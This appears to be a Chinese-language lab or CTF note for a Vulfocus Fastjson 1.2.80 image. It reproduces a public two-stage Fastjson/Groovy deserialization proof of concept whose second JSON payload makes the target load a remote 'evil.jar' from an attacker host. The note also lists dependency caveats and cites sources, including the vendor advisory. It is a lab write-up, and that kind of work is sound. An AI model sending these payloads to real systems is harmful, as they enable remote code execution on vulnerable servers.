# Fastjson 1.2.80 反序列化

> **公开链路：**同版本资料给出 Fastjson + Groovy 的两阶段远程类加载链；但没有提供本 Vulfocus 镜像的 HTTP 请求路径、Groovy 依赖清单或 `evil.jar` 构建内容，因此目前不能把它改写成可直接发送到本题的完整命令。[S1][S2]

## 题库环境

- 镜像：`vulfocus/fastjson:1.2.80`
- 内部端口：`8090`
- 题库未登记 CVE 编号。

## 公开 PoC 链

公开复现环境为 Fastjson `1.2.80`、Groovy `3.0.8`、JDK `8u12`；这不是本镜像依赖已确认的证据。[S1]

PoC 分两次提交 JSON：第一段触发 Groovy 类型处理，第二段通过 `classpathList` 加载攻击端提供的 `evil.jar`。原始请求片段如下；来源未说明本镜像接收它们的 URL、HTTP 方法及必要请求头，故不补猜目标请求命令。[S2]

1. 第一段：[S2]

   ```json
   {
     "@type":"java.lang.Exception",
     "@type":"org.codehaus.groovy.control.CompilationFailedException",
     "unit":{}
   }
   ```

2. 第二段：[S2]

   ```json
   {
     "@type":"org.codehaus.groovy.control.ProcessingUnit",
     "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
     "config": {
       "@type":"org.codehaus.groovy.control.CompilerConfiguration",
       "classpathList":["http://<攻击机>:8081/evil.jar"]
     },
     "gcl":null,
     "destDir":"/tmp"
   }
   ```

## 本题特有排坑

- **依赖决定链路是否成立：**Groovy 链的公开复现明确依赖 Groovy `3.0.8` 和 JDK `8u12`；Fastjson `1.2.80` 版本号本身不能证明本镜像具备 Groovy 类。[S1][S3]
- **两段 JSON 有先后顺序：**先提交第一段，再提交远程类加载段；第二段依赖攻击端可访问的 `evil.jar`。[S2]
- **8090 只是题库记录的内部端口：**现有来源没有给出本镜像的 JSON 解析 URL，因此不能仅凭端口拼出 `curl` 请求路径。[S1][S2]

## 来源

- **[S1] 同版本技术复现：**[CTF导航转载 — Fastjson 1.2.80 反序列化利用链分析（作者：blckder02）](https://www.ctfiot.com/60476.html) — 使用 Fastjson `1.2.80`、Groovy `3.0.8`、JDK `8u12`，说明 Groovy ASTTransformation 与远程 classpath 加载链；PoC 主体以图片呈现。支撑依赖条件及链路类型。
- **[S2] 同版本 PoC：**[su18/hack-fastjson-1.2.80](https://github.com/su18/hack-fastjson-1.2.80) — 给出 Groovy 链的两段 JSON：Groovy 类型处理请求及通过 `classpathList` 指向 `evil.jar` 的远程加载请求。支撑上述 PoC 片段、顺序和 JAR 前提；不提供本题 HTTP 路径或 JAR 构建材料。
- **[S3] Fastjson 官方安全公告：**[Alibaba Fastjson — security_update_20220523](https://github.com/alibaba/fastjson/wiki/security_update_20220523) — 说明 Fastjson `≤1.2.80` 在特定依赖存在时的安全影响及 AutoType 限制条件。用于限定版本/依赖前提，不提供本题 Payload 或 HTTP 接口。

来源清单：[`../sources/028_fastjson_1.2.80/_meta.md`](../sources/028_fastjson_1.2.80/_meta.md)
